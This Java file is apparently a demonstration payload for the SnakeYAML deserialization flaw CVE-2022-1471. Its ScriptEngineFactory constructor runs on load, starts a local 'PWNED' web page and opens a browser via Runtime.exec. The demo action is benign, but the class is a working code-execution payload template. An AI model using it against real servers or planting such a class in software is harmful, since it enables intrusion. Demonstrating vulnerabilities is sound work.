package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.util.List;
import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            // Start embedded HTTP server with PWNED page on port 9999
            HttpServer server = HttpServer.create(new InetSocketAddress(9999), 0);
            server.createContext("/", new HttpHandler() {
                @Override
                public void handle(HttpExchange exchange) throws IOException {
                    String html = "<!DOCTYPE html><html><head><title>PWNED</title>"
                        + "<style>"
                        + "* { margin: 0; padding: 0; box-sizing: border-box; }"
                        + "body { background: #0d0d0d; color: #ff1744; display: flex; "
                        + "justify-content: center; align-items: center; min-height: 100vh; "
                        + "font-family: 'Courier New', monospace; overflow: hidden; }"
                        + "@keyframes glitch { "
                        + "0% { text-shadow: 2px 0 #00fff9, -2px 0 #ff00c8; } "
                        + "25% { text-shadow: -2px 0 #00fff9, 2px 0 #ff00c8; } "
                        + "50% { text-shadow: 2px 2px #00fff9, -2px -2px #ff00c8; } "
                        + "75% { text-shadow: -2px 2px #00fff9, 2px -2px #ff00c8; } "
                        + "100% { text-shadow: 2px 0 #00fff9, -2px 0 #ff00c8; } }"
                        + "@keyframes flicker { "
                        + "0%,19%,21%,23%,25%,54%,56%,100% { opacity:1; } "
                        + "20%,24%,55% { opacity:0.4; } }"
                        + "@keyframes scanline { 0% { top: -100%; } 100% { top: 100%; } }"
                        + "h1 { font-size: 5em; animation: glitch 0.5s infinite, flicker 3s infinite; "
                        + "letter-spacing: 0.1em; text-transform: uppercase; }"
                        + "p { font-size: 1.3em; color: #ffffff; margin-top: 20px; }"
                        + ".cve { color: #ff6b6b; font-weight: bold; font-size: 1.5em; }"
                        + ".container { text-align: center; padding: 40px; position: relative; z-index: 1; }"
                        + ".skull { font-size: 4em; margin-bottom: 20px; }"
                        + ".scanline { position: fixed; width: 100%; height: 4px; "
                        + "background: rgba(255,23,68,0.15); animation: scanline 6s linear infinite; z-index: 0; }"
                        + ".detail { color: #555; margin-top: 40px; font-size: 0.9em; }"
                        + ".blink { animation: flicker 1.5s infinite; color: #ff1744; }"
                        + "</style></head>"
                        + "<body>"
                        + "<div class='scanline'></div>"
                        + "<div class='container'>"
                        + "<div class='skull'>&#9760;</div>"
                        + "<h1>You've Been PWNED</h1>"
                        + "<p style='margin-top:30px;'>Remote Code Execution achieved via</p>"
                        + "<p class='cve'>SnakeYAML Deserialization &mdash; CVE-2022-1471</p>"
                        + "<p style='margin-top:30px;color:#ccc;'>An attacker just executed arbitrary code on this server.</p>"
                        + "<p style='margin-top:10px;color:#ccc;'>This HTTP server was spawned entirely from the exploit payload.</p>"
                        + "<p class='detail'>The application used <span class='blink'>Yaml.load()</span> "
                        + "on untrusted input, allowing arbitrary Java class instantiation.</p>"
                        + "<p class='detail' style='margin-top:15px;'>Remediation: Upgrade SnakeYAML or use "
                        + "<span style=\"color:#4caf50;\">Seal Security</span> patched dependencies.</p>"
                        + "</div></body></html>";
                    byte[] bytes = html.getBytes("UTF-8");
                    exchange.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
                    exchange.sendResponseHeaders(200, bytes.length);
                    OutputStream os = exchange.getResponseBody();
                    os.write(bytes);
                    os.close();
                }
            });
            server.setExecutor(null);
            server.start();

            System.out.println();
            System.out.println("=============================================");
            System.out.println("  ☠️  [EXPLOIT] YOU'VE BEEN PWNED!  ☠️");
            System.out.println("  CVE-2022-1471 — SnakeYAML Deserialization");
            System.out.println("  PWNED page running at http://localhost:9999");
            System.out.println("=============================================");
            System.out.println();

            // Open browser — cross-platform
            String osName = System.getProperty("os.name").toLowerCase();
            if (osName.contains("mac") || osName.contains("darwin")) {
                Runtime.getRuntime().exec(new String[]{"open", "http://localhost:9999"});
            } else if (osName.contains("nux") || osName.contains("nix")) {
                try {
                    Runtime.getRuntime().exec(new String[]{"xdg-open", "http://localhost:9999"});
                } catch (Exception ignored) {
                    // Headless CI — no display, server still proves RCE
                }
            } else if (osName.contains("win")) {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", "http://localhost:9999"});
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // --- ScriptEngineFactory interface stubs (required for the exploit to work) ---
    @Override public String getEngineName() { return "pwned"; }
    @Override public String getEngineVersion() { return "1.0"; }
    @Override public List<String> getExtensions() { return List.of("pwned"); }
    @Override public List<String> getMimeTypes() { return List.of(); }
    @Override public List<String> getNames() { return List.of("pwned"); }
    @Override public String getLanguageName() { return "pwned"; }
    @Override public String getLanguageVersion() { return "1.0"; }
    @Override public Object getParameter(String key) { return null; }
    @Override public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    @Override public String getOutputStatement(String toDisplay) { return null; }
    @Override public String getProgram(String... statements) { return null; }
    @Override public ScriptEngine getScriptEngine() { return null; }
}
